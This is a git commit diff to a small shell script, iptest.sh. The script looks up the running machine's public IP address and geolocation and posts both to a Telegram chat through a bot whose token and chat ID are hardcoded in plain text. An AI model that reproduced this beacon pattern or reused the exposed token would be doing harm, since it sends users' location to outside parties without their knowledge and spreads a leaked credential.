ae9caa03417c4c9e0bae7f275970ae084e561d06
lindasmith03 <90177068+lindasmith03@users.noreply.github.com>
2022-02-08 17:25:23 +0530

    Update iptest.sh

--- iptest.sh
+++ iptest.sh
@@ -1,3 +1,3 @@
 uadd=$(curl https://api.ipify.org;echo)
-#uc=$(geoiplookup $uadd)
-curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "chat_id=-1001512557599&text=$uadd uc"
+uc=$(geoiplookup $uadd)
+curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "chat_id=-1001512557599&text=$uadd $uc"
